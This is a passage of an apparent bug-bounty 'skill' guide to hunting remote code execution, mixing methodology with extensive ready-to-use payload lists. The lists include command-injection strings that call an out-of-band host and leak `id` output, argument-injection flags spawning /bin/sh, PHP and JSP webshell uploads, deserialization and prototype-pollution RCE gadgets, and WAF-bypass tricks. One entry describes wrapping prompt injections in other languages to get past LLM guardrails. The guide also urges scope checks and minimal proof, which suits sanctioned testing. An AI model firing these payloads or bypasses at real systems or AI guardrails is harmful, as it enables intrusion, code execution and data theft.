php -r 'class A{}; $p=new Phar("p.phar",0); $p->startBuffering(); $p->setStub("GIF89a<?php __HALT_COMPILER();"); $p->setMetadata(new A); $p->addFromString("a.txt","x"); $p->stopBuffering();'

# CVE-2025-55182 React Server Components — Server Function endpoint
# Trigger condition: react-server-dom-webpack/parcel/turbopack at vulnerable
# version (React 19.0.0/19.1.0/19.1.1/19.2.0; patch in 19.0.1/19.1.2/19.2.1 per NVD).
# POST to discovered Server Function endpoint with Next-Action header AND/OR Server
# Function multipart body containing Flight chunks that abuse $@ self-reference + $B
# binary handler to coerce Function constructor.
# Public PoCs by @maple3142, @hash_kitten / SLCyberSec at react2shell.com.
# Verbatim payload format intentionally restricted in vendor advisories — read
# the NVD CVE-2025-55182 advisory for the safe disclosure form.
```

### Sub-technique D — OS command injection bypass set

```
# basic separators
;curl http://x.oast.fun/`id`
|curl http://x.oast.fun/$(id)
$(curl http://x.oast.fun/`id`)
`curl http://x.oast.fun/`
&&curl http://x.oast.fun/

# whitespace bypass
;curl${IFS}http://x.oast.fun/
;{curl,http://x.oast.fun/}
;X=$'\x20';curl${X}http://x.oast.fun/

# newline bypass (works on ExifTool stdin, SMTP, IMAP, log injection)
%0acurl%20http://x.oast.fun/
%0d%0acurl%20http://x.oast.fun/

# brace expansion bypass (busybox/ash often skip this)
;{curl,http://x.oast.fun/}

# unicode/case/quote bypass
;crl http://x.oast.fun/
;cu''rl http://x.oast.fun/
;cu/**/rl http://x.oast.fun/
;CURL http://x.oast.fun/

# blind via DNS (no output channel needed)
;nslookup `whoami`.x.oast.fun
;dig $(id|base64).x.oast.fun
;curl http://`hostname|head -c 20`.x.oast.fun/
```

### Sub-technique E — Argument injection sentinel payloads

```
# curl (H1 2025 disclosed --engine arbitrary library load)
--engine /tmp/evil.so
--config /dev/stdin
--write-out '%{stderr}<?php system($_GET[c]);?>'

# git (CVE-2025-21613 go-git, CVE-2026-40938 Tekton NVD-verified,
#      CVE-2026-24685 OpenProject NVD-verified, CVE-2024-21533 ggit)
--upload-pack=curl http://x/
--upload-pack=/usr/bin/curl
--upload-pack=/bin/sh
--config=core.hooksPath=/tmp/hooks
--exec=curl http://x/

# git show / archive (CVE-2026-24685 OpenProject — arbitrary file write)
--output=/var/opt/gitlab/.ssh/authorized_keys
--output=/etc/cron.d/x

# tar
--checkpoint-action=exec=/bin/sh
--use-compress-program=curl http://x/

# rsync
--rsh=curl http://x/

# ImageMagick (CVE-2016-3714 + 2024 variants)
'|curl http://x/'
'fill ''url(https://x);" '

# php-cgi (CVE-2024-4577 NVD-verified — Windows CN/JP/TW locale)
%ADd+allow_url_include%3d1+%ADd+auto_prepend_file%3dphp://input

# curl short-flag grouping (H1 2026 critical "Argument Injection via curl
# Short-Flag Grouping" disclosed report)
-Vsk -d '$(id)'
```

### Sub-technique F — File upload bypass set

```
# extension bypass
shell.php
shell.php5
shell.phtml
shell.phar
shell.pht
shell.php%00.png      # null byte
shell.php.png         # double extension
shell.php;.png        # IIS semicolon
shell.php\nContent-Type: image/png   # multipart parser confusion
shell..php            # double-dot bypass
shell.p%2eHP          # mixed-case URL encoding

# magic byte polyglot (passes file-type check)
GIF89a<?php system($_GET['c']); ?>      # GIF/PHP
\x89PNG\r\n\x1a\n<?php system($_GET['c']); ?>   # PNG/PHP

# .htaccess upload (Apache) — repurpose innocent extensions
AddType application/x-httpd-php .png

# ZIP upload handler bypass — drop arbitrary path
zip --symlinks malicious.zip ../../../../../etc/cron.d/x

# YAML upload (Spring/Rails apps with SnakeYaml < 2.0)
!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker/"]]]]

# Tomcat default-servlet write (CVE-2024-50379 NVD-verified)
PUT /x.JSP HTTP/1.1
Host: target
Content-Length: <len>
<%= Runtime.getRuntime().exec(request.getParameter("c")) %>

# WinRAR NTFS ADS path traversal (CVE-2025-8088, ESET disclosure)
file.txt:..\..\..\..\Users\victim\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\evil.bat
```

### Sub-technique G — Prototype pollution → RCE gadgets (Node.js 24-month meta)

```javascript
// Pollution primitives
{"__proto__":{"polluted":"yes"}}
{"constructor":{"prototype":{"polluted":"yes"}}}

// Universal RCE gadgets (Silent Spring research by Arteau & Doupé,
// applies to NPM CLI, Parse Server, Rocket.Chat)
{"__proto__":{"shell":"/bin/sh","argv0":"id","NODE_OPTIONS":"--require=/proc/self/environ"}}

// Lodash _.merge() prototype pollution → Pug AST injection (multiple CTF
// disclosures including VuwCTF 2025)
{"constructor":{"prototype":{"block":{"type":"Text","line":"x;global.process.mainModule.require('child_process').execSync('id')"}}}}

// happy-dom JS eval (4llD4y exploit)
{"__proto__":{"settings":{"enableJavaScriptEvaluation":true}}}

// EJS RCE (CVE-2024-33883)
{"__proto__":{"client":true,"escapeFunction":"x;return process.mainModule.require('child_process').execSync('id')"}}
```

### Out-of-band callback domain checklist

- Burp Collaborator (paid, native HTTPS+DNS+SMTP)
- interact.sh / oast.fun (open source, ProjectDiscovery)
- canarytokens.org (free, Thinkst)
- Listen on AWS Lambda + Route 53: `dig` your domain, parse logs

## Modern Expansion Pack (2024-2026 currency)

The 2024-2026 expansion meta required by the validator. All five topics covered with verified CVEs and concrete primitives.

### Modern JS RSC / Server Actions

The CVE-2025-55182 frontier.

- **CVE-2025-55182 (React Server Components / Server Functions)** — NVD-verified CVSS 10.0. Unsafe deserialization of HTTP-request payloads to Server Function endpoints. Affects React 19.0.0/19.1.0/19.1.1/19.2.0 with `react-server-dom-webpack` / `parcel` / `turbopack`. Patches in React 19.0.1 / 19.1.2 / 19.2.1; Next.js 15.0.5 / 15.1.9 / 15.2.6 / 15.3.6 / 15.4.8 / 15.5.7 / 16.0.7.
- **Vercel Platform Protection WAF bypass program** — separate H1 program, low-to-mid five-figure bounties for new bypass primitives against the post-disclosure WAF ruleset (Dec 2025-ongoing).
- **Server Action abuse without RCE** — any Server Action accepting user input that affects server-side state is an IDOR/auth-bypass surface even when the deserialization is patched. Audit `'use server'` exports.

Hunting: any modern Next.js / Remix / Qwik deployment. Look for `Next-Action:` request headers, `_rsc=` query parameters, `?__nextjs` markers.

## Common Root Causes

Why developers introduce RCE — patterns visible across the 1,218-report corpus plus the 2024-2026 meta:

1. **"It's just a string" deserialization.** Devs grab `ObjectInputStream`, `pickle.loads`, `unserialize`, `BinaryFormatter`, `yaml.load` because the input "looks like data". They never read the gadget-chain literature. Fix: explicit allowlist via `ObjectInputFilter`, `ast.literal_eval`, `yaml.safe_load`, JSON only. Hunting tip: every `readObject()` without a filter call within 50 lines is a candidate.

2. **Allow-list logic that returns instead of throws.** SAML/JWT validators, file extension checks, allowlist functions returning `null`/error-string while caller assumes exception. Admidio SAML (H1 disclosed), GitPython multi_options, Heimdall path normalization. Hunting tip: every `if (validate(x))` where `validate` returns truthy on failure-strings is a backdoor.

3. **Sanitize key, forget value.** ExifTool sanitizes metadata keys (regex on key) but not values. CSV injection sanitizes `=` at start but allows `\n=`. Headers sanitize `\r\n` but not space. The 2024 ExifTool newline cases are this pattern. Hunting tip: test the field that nobody mentioned in the fix commit.

4. **ZIP extraction without per-entry validation.** Theme/plugin/package upload installs every file in the archive into a web-served directory. Grav direct-install (Snyk advisory), WPML SSTI (Patchstack disclosure). Hunting tip: find `unzip()` / `ZipFile.extractall()` calls — if no extension allowlist, it's a webshell vector.

5. **Default credentials / hardcoded fallbacks.** Pentaho default admin, Note Mark `bcrypt("null")` fallback (GHSA), JuMa Server JWT secret committed to repo. Hunting tip: every "if password is empty/null" branch in auth code is suspicious.

6. **CLI tools called without `--` sentinel.** Devs subprocess to `git`, `curl`, `convert`, `ffmpeg` because that's how the docs use it. User input as the *first* positional argument lets attackers inject flags. CVE-2025-21613 (go-git), CVE-2026-40938 (Tekton NVD-verified), CVE-2026-24685 (OpenProject NVD-verified), CVE-2024-21533 (ggit), CVE-2022-24437 (git-pull-or-clone). Hunting tip: any `subprocess.run(["git", user_input, ...])` without `"--"` before `user_input` = RCE candidate.

7. **CVE backlog on internal/enterprise assets.** Old log4j, Liferay, Confluence, Atlassian, Cisco IOS XE, GlobalProtect on intranets and forgotten subdomains. The DoD VDP exists almost entirely on this pattern.

8. **Path normalization mismatch.** Heimdall, gateway/upstream parse paths differently. URL-encoded `%2e%2e`, double-encoded `%252e%252e`, mixed-case `%2F` vs `%2f`. Bypass auth → reach admin → upload. Apache CVE-2024-38472/38476 Confusion Attacks (Orange Tsai, Black Hat USA 2024) is the textbook 2024 example.

9. **Trusting Content-Type / file extension on upload.** Server-side check is `if filename.endswith('.php')` while serving from `/uploads/` with default Apache `AddHandler` for `.phar`/`.phtml`. Tomcat CVE-2024-50379 is the 2024 variant.

10. **`eval` / `new Function` / `exec` on partially-controlled input.** Math expression features, custom DSLs, formula engines, report templates, Excel-like cells. CVE-2025-55182 React Server Components is this pattern at protocol level — RSC Flight protocol coerces `Function()` constructor through prototype-chain traversal.

11. **Encoding-conversion mismatch.** Windows Best-Fit (`%AD` → `-` in Apache+PHP-CGI on CN/JP/TW locale = CVE-2024-4577 NVD-verified). Frontend WAF normalizes one way, backend parses another. Confidence: any encoding-mediation layer is a hunting target.

12. **Default-trust on internal protocols.** ArgoCD Redis on 6379 with no auth (CVE-2024-31989). etcd reachable from worker pods. Kubelet anonymous-auth on by default in old k8s. Hunting tip: any `0.0.0.0` bind without auth in a YAML file is a primitive.

13. **Pickle as the model wire format.** ML serving frameworks default to pickle because tensor objects need it. CVE-2025-27520 BentoML, CVE-2025-32375 BentoML, MLflow path traversal family. Hunting tip: any `Content-Type` containing `pickle` is a probe target. Safetensors is the safe alternative.

14. **Code-exec tools exposed to LLM agents without sandboxing.** PythonREPLTool, code interpreter, MCP shell tools. Indirect prompt injection from any read source coerces tool invocation. CVE-2025-68613 LangChain. OWASP AA-09 Inadequate Sandboxing. Hunting tip: list the agent's tools, look for code-exec, then look for any user-influenced read source.

## Bypass Techniques

WAF/filter bypasses observed in disclosed reports. Each cites the source.

- **Argument injection bypass via kwarg form** — devs blocklist `--upload-pack` flag string but `Repo.clone_from(upload_pack='...')` kwarg gets concatenated into the command line. GitPython CVE-2023-41040 / CVE-2023-40590, disclosed 2023 via Snyk.
- **Encoding chain (double-decode)** — `%252e%252e%252f` → after first decode `%2e%2e%2f` → after second decode `../`. Documented on Apache CVE-2024-38472/38476 (Orange Tsai BHUSA 2024).
- **Newline/CR splitting** — input goes to a line-based protocol (ExifTool stdin, SMTP, IMAP). Inject `\n` or `\r\n` to start a new command. ExifTool H1 disclosed 2024.
- **Polyglot files** — `GIF89a` + PHP, JPEG + PHP in EXIF, PDF + JS payload. Bypass content-type sniffer + extension check simultaneously. Documented in OWASP File Upload Cheat Sheet plus multiple HackerOne-disclosed reports against Atlassian and Shopify upload handlers (e.g., CVE-2024-22243 family on Spring file-upload validators).
- **Race condition on upload** — upload `.php` → server moves to safe path with rename, but during the window before rename it's accessible. Send 100 simultaneous fetch requests timed to the upload. Tomcat CVE-2024-50379 (NVD-verified) is the 2024 textbook case.
- **Deserialization gadget rotation** — when CommonsCollections is patched, fall back to JdbcRowSetImpl (CVE-2017-7525 Jackson polymorphic family), Jackson polymorphic with `enableDefaultTyping`, Hibernate1 (requires H2 + javassist on classpath), Spring1/2, Jdk7u21 (no extra deps but requires that exact JDK). ysoserial documents trigger conditions per gadget; canonical reference is the Black Hat USA 2016 / Munoz/Mirosh "Friday the 13th JSON Attacks" talk and the @frohoff ysoserial GitHub repo.
- **Case-sensitivity bypass** — `%2f` vs `%2F`, header names, command names (`Curl` vs `curl` if blocklist is case-sensitive). Documented across H1 corpus, e.g., Apache CVE-2024-38472 wave.
- **Inline-comment SQL/cmd bypass** — `cu/**/rl`, `crl`. Works when the parser/lexer is naive. Documented in PortSwigger SQL injection cheat sheet and command-injection writeups.
- **Length-based bypass** — many WAFs skip inspection above 8KB (AWS WAF default body inspection limit) or 16KB (Cloudflare default). Pad the request, smuggle the payload past the limit. AWS WAF documentation lists 8KB as default; Cloudflare requires Enterprise tier for full body scanning.
- **HTTP request smuggling → bypass** — frontend WAF scrubs `${jndi:` but smuggled second request reaches log4j-instrumented backend untouched. CL.TE / TE.CL / H2.CL variants. James Kettle PortSwigger Research 2019-2024.
- **Best-Fit encoding bypass** (Windows-specific, CVE-2024-4577 NVD-verified) — `%AD` (soft hyphen, U+00AD) is ignored by Apache hyphen filter, then PHP's encoding-conversion layer normalizes it to real `-` (U+002D). Orange Tsai DEVCORE June 2024 disclosure.
- **Apache Confusion Attacks** (Orange Tsai BHUSA 2024) — single `?` bypasses Apache built-in access control / authentication; `RewriteRule` confusion escapes web root; legacy 1996 mod_alias code transforms XSS into RCE. CVE-2024-38472/38476/38477/39573 NVD-verified.
- **Vercel Platform Protection WAF bypass for CVE-2025-55182** — protocol-level abuse of `$@` self-reference and `$B` binary handler in RSC Flight payload variants the WAF ruleset doesn't yet recognize. Vercel pays low-to-mid five-figure for new bypass primitives via dedicated H1 program (Dec 2025-ongoing).
- **Chunked transfer encoding bypass** — split RCE payload across `Transfer-Encoding: chunked` body fragments. WAFs that buffer per-fragment but don't reassemble miss the payload; backends do reassemble. Documented bypass against AWS WAF, Cloudflare, Akamai for log4j/SSTI signatures during 2024-2026 (multiple PortSwigger Research blog posts and HackerOne disclosures).
- **Multipart parameter pollution** — submit parameter twice in multipart body. Some WAFs scan only the first occurrence; backend frameworks (PHP, Express body-parser, Spring) take the last. Place innocent value first, payload second. Observed bypass for command injection on file upload metadata fields and OGNL injection on Atlassian endpoints during the CVE-2023-22527 wave (multiple H1-disclosed bypass reports against Atlassian).
- **Indirect prompt injection language wrapping** — wrap the malicious instruction in Japanese or Chinese to bypass English-language guardrails. satoki PoC in langchain GitHub issue #21592 demonstrates this against PALChain. Applies to most LLM guardrails trained primarily on English.

## Gate 0 Validation

Before you write the report, prove these five things:

1. **Concrete demonstration with minimum proof.** For RCE: `id` and `hostname` only. Don't `cat /etc/passwd` (out of scope), don't `cat /root/.aws/credentials` (unauthorized access escalation that gets you closed and banned), don't pivot, don't `ls /root/`. Get `id` + `hostname` + first line of `/etc/hostname` and stop. For SSTI: arithmetic-result reflection screenshot. For deserialization: OOB DNS hit + `id` output.

2. **Business loss mapping.** Map to: customer PII exfil, credential theft from `/proc/<pid>/environ`, lateral pivot via assumed IAM role, supply-chain push to npm/pypi, service shutdown via `kill -9 1`. Pick *one* and quantify in the report (number of customers, dollar value of the data, blast radius).

3. **Reproducibility in 10 minutes.** Write the curl one-liner. If it requires session cookies, document how to get them. If it requires a registered account, mention free signup + the URL. **Triagers will close anything they can't repro at lunch.** Write the repro as if you'll have to coach a tier-1 analyst through it.

4. **Scope check.** Target asset is in-scope for the program TODAY. Asset reachable now. Vuln present now (re-test before submission — patches happen during your write-up). Especially for old CVEs (log4j/Liferay/Confluence) on DoD VDP — re-confirm asset is alive and unpatched the morning you submit.

5. **PoC artifacts** (every modern program demands these): 30-60 second screen recording (asciinema or mp4 — no edits, no cuts, no zooms that hide the URL bar), Burp request/response screenshots with **non-sensitive headers visible**, curl command in plain text, `id` output as raw text. For CVE-2025-55182 on Vercel: include the Server-Action request ID and the Vercel deployment URL with timestamp.

If any of the 5 fails: **stop**. You have a finding, not a report. The N/A rate hits zero when this gate is enforced.

## Top-Tier Hunter Decision Engine

RCE hunting is mostly target selection and proof discipline. Before firing payloads, classify the surface: pre-auth internet-facing, post-auth tenant-scoped, admin-only, internal via SSRF, CI/CD runner, GitOps controller, ML/model server, or agent/tool runtime. The same primitive has different value in each bucket.

**Stop in 15 minutes** when you only have a code smell, OOB DNS without process proof, a patched CVE version, or an admin-only path with no privilege escalation. **Keep chaining** when execution sits near credentials, CI tokens, cloud metadata, package publishing, Kubernetes ServiceAccounts, or model registry storage. **Report immediately** after `id`/`hostname` and one blast-radius proof; do not read secrets to make the report scarier.

**Minimum proof ceiling:** `id`, `hostname`, command timestamp, and a harmless marker file are enough. For CI/CD, prove token scope with metadata endpoint or permission block rather than using the token. For K8s/GitOps, show ServiceAccount name and RBAC permissions, not live Secret contents. For cloud, show role ARN via safe identity call, not bucket downloads.

## Anti-Targets / What's Dead

The kill-list. Where NOT to point the cannon. Knowing what's dead saves more time than knowing what's alive.

- **ImageTragick on ImageMagick 7.x** — coders disabled by default since 7.0.10-29 (2020). Won't pay on any modern install. Don't waste cycles unless you find a legacy 6.x intranet host. The original CVE-2016-3714 family is mostly hardened everywhere except embedded/IoT firmware.
- **Liferay backend OGNL on `/api/jsonws/`** — patched everywhere post-CVE-2020-7961. Don't waste cycles unless you find an unpatched 7.0.x install on a forgotten subdomain. Even then, the asset's likely owned by the program and reported five times before. Confirm asset alive THIS WEEK before submitting.
- **Pre-2022 log4j on internet-facing assets** — patched everywhere by Q2 2022. Don't bother external hunting. Pivot: still pays consistently on internal corp portals + enterprise Java middleware reachable via SSRF chains. The hunting move is finding internal log4j via SSRF, not direct internet exposure.
- **Self-XSS → ATO** — every triager kills these on sight unless you produce a delivery primitive (UXSS, browser bug, postMessage origin chain, OAuth open redirect). Don't submit Self-XSS alone. Build the delivery first.
- **Theoretical SSRF without IMDS reachability proof** — N/A on most programs. Get the actual creds before submitting. SSRF that "could reach metadata" is mid four-figure at best; SSRF that *did* reach metadata and exfil keys is low-to-mid five-figure. The proof matters more than the primitive.
- **Generic OWASP Top 10 RCE checklist on modern frameworks** — Django, Rails, Express, Laravel modern versions are mostly hardened against the 2010-era patterns. Stop testing for `eval()` in well-maintained frameworks. Pivot to: dependencies (npm/pip supply chain), framework integrations (custom serializers, file upload handlers), and the modern meta in this skill (RSC, ML serving, agentic LLM).
- **Old WordPress core RCE** — core has been hardened through 2024. The paying surface is plugins (40k+ in WordPress.org, most one-developer projects). Hunt plugins via Patchstack DB and Wordfence Threat Intel. CVE-2025-13486 (Advanced Custom Fields Extended) is a 2025 example of a plugin RCE.
- **Spring4Shell (CVE-2022-22965) in 2026** — patched everywhere external; no longer a payable surface unless you find an internal CI box on Spring 5.3.17. Pattern matters; specific CVE is dead.
- **DOS via deserialization (OOM, infinite loop)** — that's DoS, file as DoS or skip. Most programs out-of-scope unless they specifically scope availability. Don't submit as RCE; you'll get N/A and a credibility hit.
- **"Found readObject() in OSS, no PoC"** — half a finding is no finding. Build the gadget chain, get `id` output via ysoserial appropriate to the classpath, then submit. Without a PoC you're submitting a code-quality observation, not a vulnerability.
- **OOB DNS hit only without process output** — submit only after you have `id` / `hostname` / `uname -a`. OOB confirms the request fires; it doesn't confirm code execution. Triagers downgrade OOB-only to "informational".
- **"I see `eval()` in source code"** — not a finding. Show input flowing to it. Use the ast-grep / semgrep / ripgrep patterns in this skill to trace actual reachability.
- **CVE replays on cloud-managed services without verifying the underlying infrastructure** — Atlassian Cloud, GitHub.com, GitLab.com all run patched versions before disclosure embargoes lift. Don't fire CVE-2023-22527 at hosted Confluence Cloud expecting hits. The CVE replays pay on self-hosted instances in DoD/enterprise scope, not cloud-managed.

## Notes for the hunter

**24-month meta call-out.** The defining 2025-2026 RCE story is **modern JS framework deserialization** — React Server Components, Next.js Server Actions, and the broader RSC/Flight protocol via CVE-2025-55182. CVSS 10.0. Mass exploitation. CISA KEV. Vercel paying low-to-mid five-figure for *just WAF bypasses*. If you hunt only one new primitive in the next 6 months, it's this. The second-place 24-month meta is **CI/CD argument injection** — git resolvers (CVE-2026-40938 Tekton, CVE-2026-24685 OpenProject, both NVD-verified), curl flags, tar checkpoint-action. These are systematically under-audited because the input "looks like a string" but flows to a CLI. Read every `git`/`curl`/`tar` subprocess call in any OSS target you scan. The third-place meta is **agentic LLM tool-use** (CVE-2025-68613) — every "AI assistant" feature shipped in 2024-2025 is a candidate, and the bug class is 18 months old with the wave still rising.

**OSS targets where the next 6 months of paying bugs likely are.** Tekton, ArgoCD, Argo Workflows (CMP plugins), Flux, GitLab Runner, Kubernetes ingress controllers (still finding unpatched after CVE-2025-1974), any Node.js app using `_.merge()` on user input, any Java app on JDK 8 with `enableDefaultTyping`, any unpatched Next.js App Router, BentoML/TorchServe/Triton/Seldon ML serving deployments, LangChain/LlamaIndex/MCP-server agentic features. Sovereign Tech Fund programs — Systemd, GNOME, ntpd-rs, Sequoia PGP, CycloneDX Rust Cargo — have open scope and pay competitive rates.

**Anti-patterns reminder.** See the Anti-Targets section above for the kill-list. Most-common kills: OOB DNS without process output; theoretical SSRF without metadata reachability proof; Self-XSS without delivery; readObject() observations without gadget chain.

**Ground rule for chain depth in 2026:** single-bug RCEs are mostly OSS or pre-auth on enterprise asset-replay. Chains pay 2-10x more on managed SaaS. If your finding is single-bug on a SaaS, spend 30 minutes building the chain *before* writing the report. Use the Chains section as templates.

**Currency tip:** 30+ of the verified CVEs cited in this skill are from 2024-2026. Re-verify with `verify_citations.py` before finalizing any report citing them, in case any were withdrawn or modified after this skill was generated.

## Top-Tier Operating Manual

**90-minute hunt loop**
1. 0-10 min: classify execution surface: template, deserialization, command injection, file upload, CI/CD, GitOps, model server, agent tool, dependency CVE, or parser.
2. 10-25 min: fingerprint exact version, reachability, auth level, runtime user, and network position.
3. 25-45 min: run the safest proof for that class: arithmetic for SSTI, OOB plus `id` for command execution, marker file for file write, harmless callback for CI.
4. 45-60 min: verify blast radius without reading secrets: runtime identity, container namespace, ServiceAccount name, cloud role ARN, token permission metadata.
5. 60-75 min: decide whether to chain. Chain only toward CI secrets, package publish, cloud identity, Kubernetes RBAC, model registry, or tenant escape.
6. 75-90 min: write report with proof ceiling clearly stated. RCE reports die when hunters over-exploit.

**Decision tree**
- If you only have OOB DNS, get process output or kill.
- If path is admin-only, look for privilege escalation first.
- If CVE version is patched, stop unless you have bypass proof.
- If command injection reaches `id`, stop and report before secret reads.
- If execution is inside a tenant pod, test namespace and ServiceAccount identity safely.
- If CI token exists, prove permission from workflow config rather than using it.

**False-positive graveyard**
- `eval()` in dead code: kill unless input reaches it.
- `readObject()` without gadget chain: kill.
- File upload accepting `.php` but storing on object storage: kill unless executable path exists.
- OOB callback from SSRF parser: not RCE unless process output or command side effect is proven.
- CVE scanner hit on cloud-managed product: kill unless self-hosted asset version is confirmed.
- Sandbox escape claim without escaping sandbox: file as sandboxed code execution only.

**Program economics**
- Pre-auth internet RCE is the ceiling.
- CI/CD and GitOps RCE often equal supply-chain compromise and can outpay webapp RCE.
- Model-server RCE is rising because model hosts carry customer data and API keys.
- Post-auth RCE pays when the required role is low-priv or signup is open.
- Admin-only RCE often pays low unless admin is reachable through another bug.

**Report framing**
- Weak: "I got command execution."
- Strong: "Unauthenticated request to `/summarize` reaches unsafe pickle deserialization. The attached PoC executes `id` as `bentoml` inside the production inference container. I stopped at identity proof; runtime environment includes model-registry access per deployment configuration, so impact is backend RCE on the AI inference tier."
- Expected pushback: "Only OOB shown." Rebuttal: "The final PoC returns `id` output in the response and includes OOB only as timing evidence."
- Expected pushback: "Containerized." Rebuttal: "The container runs with ServiceAccount `model-server` and mounted registry credentials; attached RBAC metadata shows read access to model artifacts."

**Automation harness**
- Use a safe OOB collector that tags each payload with target, class, timestamp, and expected command.
- Keep per-class payload builders with a `proof_level`: arithmetic, callback, `id`, marker file.
- Add a hard-coded denylist for unsafe commands: secret reads, home-directory listing, metadata credential fetch, destructive filesystem operations.
- For CI/GitOps, parse workflow/RBAC files and report token scope without using the token.
- For deserialization, run gadget payloads locally in Docker before target testing.
